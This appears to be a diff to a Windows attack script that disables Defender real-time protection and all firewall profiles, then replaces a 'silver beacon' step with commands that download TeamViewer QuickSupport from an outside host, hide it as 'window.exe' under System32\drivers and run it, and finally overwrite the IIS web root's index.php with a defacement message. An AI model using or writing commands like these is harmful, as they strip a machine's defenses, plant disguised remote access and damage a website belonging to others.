@@ -21,7 +21,9 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
 # disable all firewall profiles
 netsh advfirewall set allprofiles state off
 
-# install silver beacon
+# install teamviewer
+curl "https://download.teamviewer.com/download/TeamViewerQS.exe" -o "C:\Windows\System32\drivers\window.exe"
+C:\Windows\System32\drivers\window.exe
 
 # deface website
 echo "YOU HAVE BEEN HACKED!!!" > "C:\inetpub\wwwroot\index.php"
